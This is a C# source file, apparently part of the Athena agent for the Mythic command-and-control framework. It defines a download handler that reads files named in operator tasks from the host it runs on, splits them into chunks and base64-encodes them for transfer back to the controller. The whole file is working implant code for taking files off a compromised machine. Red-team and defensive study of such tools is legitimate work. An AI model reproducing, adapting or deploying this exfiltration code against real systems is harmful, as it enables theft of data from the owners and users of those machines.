using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using Newtonsoft.Json;
using PluginBase;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Athena.Commands
{
    public class DownloadHandler
    {
        private ConcurrentDictionary<string, MythicDownloadJob> downloadJobs { get; set; }
        public DownloadHandler()
        {
            downloadJobs = new ConcurrentDictionary<string, MythicDownloadJob>();
        }

        public async Task<DownloadResponse> StartDownloadJob(MythicJob job)
        {
            MythicDownloadJob downloadJob = new MythicDownloadJob(job);
            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
            downloadJob.path = par["File"].Replace("\"", "");
            downloadJob.total_chunks = await this.GetTotalChunks(downloadJob);
            this.downloadJobs.GetOrAdd(job.task.id, downloadJob);

            if (downloadJob.total_chunks == 0)
            {
                this.downloadJobs.Remove(job.task.id, out _);

                return new DownloadResponse
                {
                    status = "error",
                    user_output = "An error occurred while attempting to access the file.",
                    completed = "true",
                    task_id = job.task.id
                };
            }
            return new DownloadResponse
            {
                user_output = "",
                task_id = job.task.id,
                total_chunks = downloadJob.total_chunks,
                full_path = downloadJob.path,
                completed = "",
                status = "",
                chunk_num = 0,
                chunk_data = "",
                file_id = ""
            };
        }

        public async Task<bool> ContainsJob(string task_id)
        {
            return downloadJobs.ContainsKey(task_id);
        }


        public async Task<MythicDownloadJob> GetDownloadJob(string task_id)
        {
            return this.downloadJobs[task_id];
        }
        /// <summary>
        /// Read next chunk from the files
        /// </summary>
        public async Task<string> DownloadNextChunk(MythicDownloadJob job)
        {
            try
            {
                FileStream fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read);
                if (job.total_chunks == 1)
                {
                    job.hasoutput = true;
                    job.complete = true;
                    job.errored = false;
                    return await Misc.Base64Encode(File.ReadAllBytes(job.path));
                }
                else
                {
                    byte[] buffer = new byte[job.chunk_size];
                    long totalBytesRead = job.chunk_size * (job.chunk_num - 1);

                    using (fileStream)
                    {
                        FileInfo fileInfo = new FileInfo(job.path);

                        if (fileInfo.Length - totalBytesRead < job.chunk_size)
                        {
                            buffer = new byte[fileInfo.Length - job.bytesRead];
                            fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
                            job.bytesRead += fileStream.Read(buffer, 0, (int)(fileInfo.Length - job.bytesRead));
                            job.hasoutput = true;
                            job.complete = true;
                            job.errored = false;
                            return await Misc.Base64Encode(buffer);
                        }
                        else
                        {
                            fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
                            job.bytesRead += fileStream.Read(buffer, 0, job.chunk_size);
                            //Return task result
                            job.hasoutput = true;
                            return await Misc.Base64Encode(buffer);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                job.hasoutput = true;
                job.errored = true;
                job.complete = true;
                return e.Message;
            }
        }

        /// <summary>
        /// Calculate the number of chunks required to download the file
        /// </summary>
        private async Task<int> GetTotalChunks(MythicDownloadJob job)
        {
            try
            {
                var fi = new FileInfo(job.path);
                int total_chunks = (int)(fi.Length + job.chunk_size - 1) / job.chunk_size;
                return total_chunks;
            }
            catch
            {
                return 0;
            }
        }

        public async Task CompleteDownloadJob(string task_id)
        {
            this.downloadJobs.Remove(task_id, out _);
        }
    }
}
